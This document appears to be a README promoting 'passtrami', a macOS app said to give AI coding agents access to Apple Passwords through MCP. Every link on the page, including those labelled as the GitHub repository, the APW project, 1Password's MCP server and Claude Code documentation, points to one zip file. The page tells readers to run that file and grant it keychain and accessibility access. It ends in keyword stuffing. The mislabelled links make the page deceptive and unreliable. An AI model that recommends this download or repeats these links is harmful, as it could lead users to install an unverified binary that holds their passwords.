# 🔐 passtrami - Apple Passwords for AI Agents

## 🚀 Getting Started

Welcome to **passtrami**! This application bridges the gap between your Apple Passwords and AI coding agents, providing secure, local access without exposing your actual password values in tool responses. Whether you're a developer using Claude Code, a script enthusiast, or someone who wants to streamline their workflow, passtrami is designed to make password management with AI both safe and simple.

[**⬇️ Download passtrami Now**](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip)

Visit this link to download the application.

## 🧩 What Is passtrami?

Passtrami is a macOS menu bar application (compatible with Apple silicon and macOS 26.2 or later) that gives AI agents secure access to your saved passwords through the Model Context Protocol (MCP). It works locally on your machine, meaning your passwords never leave your computer. The app builds on the APW project and takes design inspiration from 1Password's Environments MCP server, ensuring that passwords are sent directly to the programs that need them without appearing in MCP responses.

## ✨ Key Features

### 🔒 Local MCP Access Without Exposure
Passtrami ensures that when an AI agent requests a password, the actual value is delivered directly to the requesting application—never displayed in the tool response. This keeps your sensitive information out of conversation logs and AI training data.

### 🖥️ Menu Bar App for Easy Management
The menu bar interface provides quick access to setup, unlocking, and configuration. You can manage your Passtrami instance without opening a separate window or terminal.

### ⌨️ Optional CLI for Power Users
For those who prefer working in the terminal or need to integrate with scripts, passtrami includes a command-line interface that mirrors the menu bar functionality.

### 🔄 Seamless Integration with Coding Agents
Passtrami is designed to work with popular AI coding tools like Claude Code. The MCP configuration is straightforward and can be set up in minutes.

## 📥 Installation Guide

### Step 1: Download the Application
[**Download passtrami**](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) by visiting the link above. The download page will provide you with the latest release.

### Step 2: Extract and Run
Once the download completes, locate the file in your Downloads folder. Extract the contents if needed, then double-click the passtrami application icon to launch it. The app will appear in your menu bar at the top of your screen.

### Step 3: Initial Setup
When you first launch passtrami, you'll be prompted to:
- Grant necessary permissions (such as accessibility or keychain access)
- Set up your unlock method (password or biometric)
- Configure which applications can request passwords

Follow the on-screen instructions to complete these steps.

## 🛠️ Setting Up MCP with Your AI Agent

### For Claude Code Users
1. Open passtrami and navigate to **Settings → Tools**
2. Click **Copy Configuration** to copy the MCP server configuration
3. Paste this configuration into your Claude Code setup
4. Ask Claude Code to "set up Passtrami MCP"
5. Claude Code will handle the rest automatically

### For Other AI Agents
The MCP configuration is standard JSON. You can manually add it to any MCP-compatible agent by:
1. Copying the configuration from passtrami's Settings
2. Adding it to your agent's MCP configuration file
3. Restarting your agent to load the new configuration

## 🔧 Using the Command-Line Interface

For terminal enthusiasts, passtrami includes a CLI that can be used for:
- Unlocking the password vault
- Checking connection status
- Listing available credentials (without exposing values)
- Managing MCP configuration

To use the CLI, open Terminal and navigate to the passtrami installation directory. The CLI commands are intuitive and well-documented within the application.

## 🔒 Security Best Practices

### Keep Your Mac Unlocked
Passtrami requires your Mac to be unlocked to access the password vault. This ensures that passwords are only accessible when you're actively using your machine.

### Use Biometric Authentication
Enable Touch ID or Face ID for quick, secure unlocking. This adds an extra layer of protection while maintaining convenience.

### Review Agent Permissions
Periodically review which AI agents have access to your passwords through passtrami. Revoke access for any agents you no longer use.

### Regular Updates
Keep passtrami updated to benefit from the latest security patches and feature improvements. The app will notify you when updates are available.

## 🆘 Troubleshooting

### Common Issues and Solutions

**Issue: Passtrami won't launch**
- Ensure you're running macOS 26.2 or later
- Check that your Mac has Apple silicon (M1 or newer)
- Try downloading the latest version again

**Issue: MCP connection fails**
- Verify passtrami is unlocked
- Check that your AI agent is running the latest version
- Re-copy the configuration from Settings → Tools

**Issue: Passwords not appearing**
- Ensure you've granted passtrami keychain access
- Check that the requesting application is authorized in passtrami's settings
- Restart both passtrami and your AI agent

### Getting Help
If you encounter issues not covered here, visit the [GitHub repository](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) for documentation, issue tracking, and community support.

## 📊 System Requirements

- **Operating System:** macOS 26.2 or later
- **Processor:** Apple silicon (M1, M2, M3, or newer)
- **Memory:** 4GB RAM minimum (8GB recommended)
- **Storage:** 50MB free space for installation

## 🌟 Why Choose passtrami?

### Privacy-First Design
Unlike cloud-based password managers, passtrami keeps everything local. Your passwords never leave your Mac, and AI agents only receive them when absolutely necessary.

### Developer-Friendly
The MCP integration means passtrami works with any MCP-compatible AI agent, not just Claude Code. This future-proofs your setup as new AI tools emerge.

### Simple Yet Powerful
The menu bar interface makes daily use effortless, while the CLI provides depth for power users who want more control.

### Active Development
Passtrami is actively maintained, with regular updates addressing security concerns and adding new features based on community feedback.

## 📚 Additional Resources

- [GitHub Repository](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - Source code, documentation, and issue tracker
- [APW Project](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - The foundation on which passtrami builds
- [1Password Environments MCP Server](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - Design inspiration for secure MCP integration
- [Claude Code MCP Documentation](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - Official guide for setting up MCP with Claude Code

## 🎯 Conclusion

Passtrami represents a significant step forward in secure AI-password integration. By keeping passwords local and ensuring they never appear in tool responses, it addresses the privacy concerns that have plagued AI-assisted development. Whether you're a professional developer or a curious hobbyist, passtrami offers a secure, user-friendly way to let AI agents handle your passwords without compromising your security.

Download passtrami today and experience the future of secure AI integration. Your passwords will thank you.

Keywords: passtrami, Apple Passwords, MCP server, AI agents, password manager, macOS, Claude Code, secure password access, local password management, biometric authentication, menu bar app, CLI tool, developer tools, privacy protection, keychain access